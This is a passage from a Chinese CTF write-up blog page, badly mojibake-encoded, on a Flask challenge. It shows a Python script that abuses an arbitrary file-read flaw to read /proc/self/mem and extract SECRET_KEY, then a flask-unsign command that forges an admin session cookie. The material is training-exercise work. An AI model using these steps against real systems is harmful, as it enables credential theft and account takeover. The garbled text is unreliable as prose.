<p>ç”±äº Python Flask åœ¨è¿è¡Œæ—¶ä¼šå°† <span class="hexo-wm">sâ€‹â€‹â‘¶ğ˜·ğ˜¦ğ’Â·â€ğ’”ğ¢â€teâ€â€</span>SECRET_KEY å†™å…¥å†…å­˜ä¸­ï¼Œ</p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´è¯»å–å†…å­˜æ¥è·å¾— <span class="hexo-wm">Ñ•â€‹ğŸ¯ğ˜·eğ§Â·â€â€Œğ’”ï½‰â€‹â€Œğ­eâ€Œâ€</span>SECRET_KEY</p>
<p>Python <span class="hexo-wm">sï»¿Â³vâ„¯ğ§â€¢â€‹ğ¬â…ˆï»¿ï»¿ğ’•ï½…â€‹</span>å†…å­˜è¯»å–è„šæœ¬å¦‚ä¸‹</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

url <span class="token operator">=</span> <span class="token punctuation">(</span>SpiritCTF Server URL <span class="token keyword">with</span> port<span class="token punctuation">)</span>

rw <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

map_list <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/download?filename=/proc/self/maps"</span></span><span class="token punctuation">)</span>
map_list <span class="token operator">=</span> map_list<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> map_list<span class="token punctuation">:</span>
    map_addr <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r"([a-z0-9]+)-([a-z0-9]+) r"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
    <span class="token keyword">if</span> map_addr<span class="token punctuation">:</span>
        start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>map_addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
        end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>map_addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
        rw<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> k <span class="token keyword">in</span> rw<span class="token punctuation">:</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/download?filename=/proc/self/mem&amp;offset=</span><span class="token interpolation"><span class="token punctuation">{</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">&amp;length=</span><span class="token interpolation"><span class="token punctuation">{</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        secret_key <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"I_LIKE_[a-f0-9]{32}_Aoyama_Nanami"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> secret_key<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"SECRET_KEY = \""</span> <span class="token operator">+</span> secret_key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\""</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span></code></pre>
<p>è¿è¡Œè„šæœ¬åå¾—åˆ°ï¼š</p>
<pre class="language-none"><code class="language-none">SECRET_KEY = "I_LIKE_f9d2e4914fec5f9f26fad0a0e4da3afe_Aoyama_Nanami"</code></pre>

<p>ä½¿ç”¨ <a href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a> å·¥å…·å¯¹ Session è¿›è¡Œä¼ªé€ å¹¶ç­¾å</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">flask-unsign <span class="token parameter variable">--sign</span> <span class="token parameter variable">--cookie</span> <span class="token string">"{'username': 'admin'}"</span> <span class="token parameter variable">--secret</span> <span class="token string">'I_LIKE_f9d2e4914fec5f9f26fad0a0e4da3afe_Aoyama_Nanami'</span></code></pre>
<p>å¾—åˆ° Sessi<span class="hexo-wm">sâ€Œï»¿â‘¶ğ’—ğ˜¦ğ’.â€â€‹ğ˜´iâ€ğ­ğâ€Œï»¿</span>on å¦‚ä¸‹ï¼š</p>
<pre class="language-none"><code class="language-none">eyJ1c2VybmFtZSI6ImFkbWluIn0.ZRRqXA.6kG8cNrvnCI73R2nxAF8iOSA6Ko</code></pre>

<p>ä¿®æ”¹Cookies <code>Session</code> å¹¶è®¿é—® <code>/download?filename=xingtie?qidong!</code>ï¼Œå¾—åˆ° <code>flag</code></p>
<p><img src="image-46.png" alt="image-46.png"></p>
<blockquote>
<p>Spirit{7d05af5f-<span class="hexo-wm">ğ˜´â€Œâ€‹3ğ˜·eï½<span class="hexo-wm">Ñ•â€Œâ€â‘¶ğ’—enï¼â€ï»¿êœ±ğ¢ï»¿ï»¿ğ’•ï½…â€Œï»¿</span>â€¢ï»¿â€ğ˜€ğ˜ªâ€â€Œï½”ï½…â€‹</span>202d-4578-8833-f598ad794b48}</p>
</blockquote>
</body></html>
        </div>
        
          <div class="prev-or-next">
            <div class="post-foot-next">
              
            </div>
            <div class="post-foot-prev">
              
                <a href="../2023-geekgame-writeup/" target="_self">
                  <span>ä¸‹ä¸€é¡µ</span>
                  <i class="iconfont icon-chevronright"></i>
                </a>
              
            </div>
          </div>
        
      </div>
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="catalog-zoom">
      <div class="title">ç›®å½•</div>
      <div class="catalog-content">
        
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E4%BB%8B%E7%BB%8D"><span class="toc-text">æ¯”èµ›ä»‹ç»</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%83%AD%E8%BA%AB%E8%B5%9B%E4%B8%8E%E6%AD%A3%E8%B5%9B"><span class="toc-text">çƒ­èº«èµ›ä¸æ­£èµ›</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Signin1"><span class="toc-text">Signin1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Signin2"><span class="toc-text">Signin2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9ADevTools-curl"><span class="toc-text">1. æ–¹æ³•ä¸€ï¼šDevTools + curl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9ABurp-Suite"><span class="toc-text">2. æ–¹æ³•äºŒï¼šBurp Suite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Flag-%E8%A7%A3%E5%AF%86"><span class="toc-text">3. Flag è§£å¯†</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#baby-php"><span class="toc-text">baby_php</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="toc-text">1. ç¬¬ä¸€éƒ¨åˆ†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E6%9E%84%E9%80%A0%E9%9D%9E%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87-%E4%BB%85%E9%99%90%E4%BA%8E%E6%97%A7%E7%89%88%E6%9C%ACPHP"><span class="toc-text">1.1 æ„é€ éå­—ç¬¦ä¸²å‚æ•°ç»•è¿‡ (ä»…é™äºæ—§ç‰ˆæœ¬PHP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E5%88%A9%E7%94%A8%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%89%B9%E6%80%A70e%E7%BB%95%E8%BF%87"><span class="toc-text">1.2 åˆ©ç”¨å¼±ç±»å‹ç‰¹æ€§0eç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8md5%E7%A2%B0%E6%92%9E"><span class="toc-text">1.3 ç›´æ¥ä½¿ç”¨md5ç¢°æ’</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86"><span class="toc-text">2. ç¬¬äºŒéƒ¨åˆ†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86"><span class="toc-text">3. ç¬¬ä¸‰éƒ¨åˆ†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%B0%8F%E7%9B%B2%E7%82%B9"><span class="toc-text">3.1 å°ç›²ç‚¹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-Web"><span class="toc-text">ez_Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AC%AC%E4%B8%80%E5%B1%82%EF%BC%9A301-Redirect"><span class="toc-text">1. ç¬¬ä¸€å±‚ï¼š301 Redirect</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-curl-%E6%96%B9%E6%B3%95"><span class="toc-text">1.1 curl æ–¹æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-burp-suite-%E6%96%B9%E6%B3%95"><span class="toc-text">1.2 burp suite æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AC%AC%E4%BA%8C%E5%B1%82%EF%BC%9AGET-%E4%BC%A0%E5%8F%82"><span class="toc-text">2. ç¬¬äºŒå±‚ï¼šGET ä¼ å‚</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%AC%AC%E4%B8%89%E5%B1%82%EF%BC%9Afile-get-contents-%E5%88%A9%E7%94%A8"><span class="toc-text">3. ç¬¬ä¸‰å±‚ï¼šfile_get_contents() åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-PS-preg-match-%E7%BB%95%E8%BF%87"><span class="toc-text">3.1 PS: preg_match ç»•è¿‡</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-Web2"><span class="toc-text">ez_Web2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AC%AC%E4%B8%80%E5%B1%82%EF%BC%9Arobots-%E6%B3%84%E9%9C%B2"><span class="toc-text">1. ç¬¬ä¸€å±‚ï¼šrobots æ³„éœ²</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AC%AC%E4%BA%8C%E5%B1%82%EF%BC%9A%E5%BC%B1%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">2. ç¬¬äºŒå±‚ï¼šå¼±å¯†ç çˆ†ç ´</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%AC%AC%E4%B8%89%E5%B1%82%EF%BC%9Afile-put-contents-%E5%88%A9%E7%94%A8"><span class="toc-text">3. ç¬¬ä¸‰å±‚ï¼šfile_put_contents() åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-HackBar"><span class="toc-text">3.1 HackBar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-curl"><span class="toc-text">3.2 curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-PS-str-replace-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">3.3 PS: str_replace ç»•è¿‡æ–¹æ³•</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-sql"><span class="toc-text">ez_sql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">1. è¯»å–æ•°æ®åº“å</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%EF%BC%88%E9%BB%98%E8%AE%A4%E7%AC%AC%E4%B8%80%E5%BC%A0%E8%A1%A8%EF%BC%89"><span class="toc-text">2. è¯»å–æ•°æ®è¡¨åï¼ˆé»˜è®¤ç¬¬ä¸€å¼ è¡¨ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%AF%BB%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-%E9%BB%98%E8%AE%A4%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E6%AE%B5"><span class="toc-text">3. è¯»å–å­—æ®µå (é»˜è®¤ç¬¬ä¸€ä¸ªå­—æ®µ)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%AF%BB%E5%8F%96-flag-%E5%86%85%E5%AE%B9"><span class="toc-text">4. è¯»å– flag å†…å®¹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pin-pin-revenge"><span class="toc-text">pin &amp; pin_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3-%E4%BB%85pin%E9%A2%98%E5%86%85%E5%AD%98%E5%9C%A8"><span class="toc-text">1. éé¢„æœŸè§£ (ä»…piné¢˜å†…å­˜åœ¨)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%A2%84%E6%9C%9F%E8%A7%A3-pin-pin-revenge%E9%80%9A%E7%94%A8"><span class="toc-text">2. é¢„æœŸè§£ (pin&amp;pin_revengeé€šç”¨)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-PIN%E7%94%9F%E6%88%90%E8%A6%81%E7%B4%A0"><span class="toc-text">2.1 PINç”Ÿæˆè¦ç´ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-username"><span class="toc-text">2.1.1 username</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-modname"><span class="toc-text">2.1.2 modname</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-appname"><span class="toc-text">2.1.3 appname</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-moddir"><span class="toc-text">2.1.4 moddir</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-5-uuidnode"><span class="toc-text">2.1.5 uuidnode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-6-machine-id"><span class="toc-text">2.1.6 machine_id</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-Python-3-8-MD5-Pin%E8%AE%A1%E7%AE%97%E4%BB%A3%E7%A0%81"><span class="toc-text">2.2 Python &lt; 3.8 MD5 Pinè®¡ç®—ä»£ç </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Python-3-8-sha1-Pin%E8%AE%A1%E7%AE%97%E4%BB%A3%E7%A0%81"><span class="toc-text">2.3 Python &gt;&#x3D; 3.8 sha1 Pinè®¡ç®—ä»£ç </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E5%88%A9%E7%94%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-text">2.4 åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–è·å–ä¿¡æ¯</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-%E8%AF%BB%E5%8F%96-username"><span class="toc-text">2.4.1 è¯»å– username</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-2-%E8%AF%BB%E5%8F%96-moddir"><span class="toc-text">2.4.2 è¯»å– moddir</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-3-%E8%AF%BB%E5%8F%96-uuidnode"><span class="toc-text">2.4.3 è¯»å– uuidnode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-4-%E8%AF%BB%E5%8F%96-machine-id"><span class="toc-text">2.4.4 è¯»å– machine_id</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E8%8E%B7%E5%8F%96-debug-shell"><span class="toc-text">2.5 è·å– debug shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-xxe"><span class="toc-text">ez_xxe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sharpshop"><span class="toc-text">sharpshop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8F%8D%E7%BC%96%E8%AF%91ELF-app"><span class="toc-text">1. åç¼–è¯‘ELF-app</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-text">2. ç«æ€æ¡ä»¶åˆ©ç”¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-text">3. è§£å†³æ–¹æ¡ˆ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%81%E5%88%86%E4%BD%A0%E8%A6%81%E4%B8%8D%E8%A6%81"><span class="toc-text">é€åˆ†ä½ è¦ä¸è¦&gt;_&lt;</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E8%AF%86%E5%88%AB"><span class="toc-text">1. ä¸å¯è§å­—ç¬¦è¯†åˆ«</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-eval-%E5%88%A9%E7%94%A8"><span class="toc-text">2. eval åˆ©ç”¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Payload-%E6%9E%84%E9%80%A0"><span class="toc-text">3. Payload æ„é€ </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Python-requests-POST"><span class="toc-text">3.1 Python requests POST</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-ssti"><span class="toc-text">easy_ssti</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E5%96%9C%E6%AC%A2%E9%B8%A3%E6%BF%91%E7%99%BD%E7%BE%BD%E5%90%97"><span class="toc-text">ä½ å–œæ¬¢é¸£æ¿‘ç™½ç¾½å—</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">1. ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-JWT-Json-Web-Tokens"><span class="toc-text">2. JWT (Json Web Tokens)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-JWT-%E7%9A%84%E7%BB%84%E6%88%90"><span class="toc-text">2.1 JWT çš„ç»„æˆ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-Header"><span class="toc-text">2.1.1 Header</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-Payload"><span class="toc-text">2.1.2 Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-Signature"><span class="toc-text">2.1.3 Signature</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-Base64URL"><span class="toc-text">2.1.4 Base64URL</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-JWT%E7%9A%84%E4%BC%AA%E9%80%A0"><span class="toc-text">2.2 JWTçš„ä¼ªé€ </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Payload"><span class="toc-text">3. Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E7%9C%9F%E7%9A%84%E5%96%9C%E6%AC%A2%E9%B8%A3%E6%BF%91%E7%99%BD%E7%BE%BD%E5%90%97"><span class="toc-text">ä½ çœŸçš„å–œæ¬¢é¸£æ¿‘ç™½ç¾½å—</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-1"><span class="toc-text">1. ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Python-Flask-Session"><span class="toc-text">2. Python Flask Session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-Session-%E7%9A%84%E7%BB%84%E6%88%90"><span class="toc-text">2.1 Session çš„ç»„æˆ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-Session-Data"><span class="toc-text">2.1.1 Session Data</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-Timestamp"><span class="toc-text">2.1.2 Timestamp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-Cryptograhpic-Hash"><span class="toc-text">2.1.3 Cryptograhpic Hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-Base64URL-1"><span class="toc-text">2.1.4 Base64URL</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-Session-%E7%9A%84%E4%BC%AA%E9%80%A0"><span class="toc-text">2.2 Session çš„ä¼ªé€ </span></a></li></ol></li></ol></li></ol>
        
      </div>
    </div>
  </div>

  
<script src="../../js/catalog.js"></script>




    
  </div>
  <script>
    (() => {
      function compensate() {
        const bodyBox = document.querySelector('.zoom-wrap');
        if (bodyBox) {
          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
          bodyBox.style.marginBottom = `-${gapY}px`;
        }

        const catBox = document.querySelector('.catalog-zoom');
        if (catBox) {
          const rect = catBox.getBoundingClientRect();
          const gapX = catBox.offsetWidth  - rect.width;
          const gapY = catBox.offsetHeight - rect.height;

          const list = catBox.querySelector('.catalog-content');
          if (list) {
            const orig = list.dataset.origHeight
                      ? parseFloat(list.dataset.origHeight)
                      : parseFloat(getComputedStyle(list).height);
            list.dataset.origHeight = orig;
            list.style.height       = (orig + gapY) + 'px';
          }

          catBox.style.marginRight  = `-${gapX}px`;
          catBox.style.marginBottom = `-${gapY}px`;
        }
      }

      function hookImages(root = document) {
        root.querySelectorAll('img').forEach(img => {
          if (img.dataset._scaledFix) return;
          img.dataset._scaledFix = 1;
          img.addEventListener('load', compensate, {once: true});
        });
      }

      addEventListener('DOMContentLoaded', () => {
        compensate();
        hookImages();
      });

      addEventListener('resize', compensate);

      const observer = new MutationObserver(muts => {
        muts.forEach(m => {
          m.addedNodes.forEach(n => {
            if (n.nodeType !== 1) return;
            if (n.tagName === 'IMG') hookImages(n.parentNode);
            else hookImages(n);
          });
        });
      });

      const wrap = document.querySelector('.zoom-wrap');
      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
    })();
  </script>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" href="https://github.com/security-s3ven">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/security-s3ven">Copyright Â© 2023-2026 s3ven</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="../../js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="æœç´¢...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>é¦–æ¬¡æœç´¢ï¼Œæ­£åœ¨è½½å…¥ç´¢å¼•æ–‡ä»¶ï¼Œè¯·ç¨åâ€¦â€¦<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>æ²¡æœ‰æ‰¾åˆ°å†…å®¹ï¼Œè¯·å°è¯•æ›´æ¢æ£€ç´¢è¯ã€‚<span></ul>";
            }
